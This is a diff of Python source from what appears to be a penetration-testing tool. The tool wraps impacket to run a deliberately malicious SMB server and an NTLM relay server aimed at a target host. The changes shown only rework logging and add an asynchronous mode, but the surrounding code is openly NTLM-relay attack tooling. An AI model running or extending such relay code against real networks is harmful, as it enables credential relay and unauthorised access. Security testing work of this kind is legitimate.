@@ -1,7 +1,7 @@
 from impacket.smbserver import SimpleSMBServer
 import logging
 from loguru import logger
-from .interceptlogging import InterceptHandler
+from .interceptlogging import InterceptHandlerOnlyFiles, InterceptHandlerStdout
 
 from impacket.examples.ntlmrelayx.servers.smbrelayserver import SMBRelayServer
 from impacket.examples.ntlmrelayx.clients.smbrelayclient import SMBRelayClient
@@ -50,18 +50,20 @@ class MaliciousSmbServer(SimpleSMBServer):
     def start_malicious_smbserver(self) -> None:
         """[ Function to start the smb server ]"""
         logger.bind(name="info").info("Starting Malicious SMB Server ...")
-        logging.basicConfig(handlers=[InterceptHandler()], level=0)
+        logging.basicConfig(handlers=[InterceptHandlerStdout()], level=0)
         super().setSMBChallenge("")
         super().start()
 
 
 class NtlmRelayServer:
-    def __init__(self, lhost: str, port: str, rhost: str):
+    def __init__(self, lhost: str, port: str, rhost: str, asynchronous: bool):
         self.__lhost = lhost
         self.__port = port
         self.__rhost = rhost
         self.__attacks = {"SMB": SMBAttack}
         self.__clients = {"SMB": SMBRelayClient}
+        self.__asynchronous = asynchronous
+        self.output_of_connections()
 
     @property
     def lhost(self) -> str:
@@ -83,6 +85,10 @@ class NtlmRelayServer:
     def clients(self) -> dict:
         return self.__clients
 
+    @property
+    def asynchronous(self) -> bool:
+        return self.__asynchronous
+
     @port.setter
     def port(self, port: str) -> None:
         self.__port = port
@@ -91,9 +97,21 @@ class NtlmRelayServer:
     def lhost(self, lhost: str) -> None:
         self.__lhost = lhost
 
+    def output_of_connections(self) -> None:
+        logger.add(
+            "logs/ntlm_relay.log",
+            level="INFO",
+            rotation="1 week",
+        )
+
     def start_ntlm_relay_server(self) -> None:
-        logging.basicConfig(handlers=[InterceptHandler()], level=0)
-        logger.bind(name="info").info("Starting ntlm-relay attack...")
+        if self.asynchronous:
+            logging.basicConfig(handlers=[InterceptHandlerOnlyFiles()], level=0)
+            logger.bind(name="info").debug("Starting ntlm-relay attack...")
+        else:
+            logging.basicConfig(handlers=[InterceptHandlerStdout()], level=0)
+            logger.bind(name="info").info("Starting ntlm-relay attack...")
+
         target = TargetsProcessor(
             singleTarget=self.rhost,
             protocolClients=self.clients,
